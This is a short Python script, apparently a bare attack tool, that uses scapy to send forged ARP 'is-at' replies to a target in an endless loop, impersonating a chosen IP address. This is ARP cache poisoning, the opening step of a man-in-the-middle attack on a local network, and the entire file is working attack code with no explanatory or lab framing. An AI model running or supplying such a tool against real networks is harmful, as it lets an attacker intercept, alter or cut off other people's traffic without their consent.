#! /usr/bin/python3

import sys
import time
from scapy.layers.l2 import ARP, Ether
from scapy.all import sendp

if len(sys.argv) < 3:
    print(sys.argv[0] + ": <target> <spoof_ip>")
    sys.exit(1)
    
iface = "eth0"
targetIP = sys.argv[1]
fakeIP = sys.argv[2]

ethernet = Ether()
arp = ARP(pdst=targetIP, psrc=fakeIP, op="is-at")
packet = ethernet / arp

while True:
    sendp(packet, iface=iface)
    time.sleep(1)
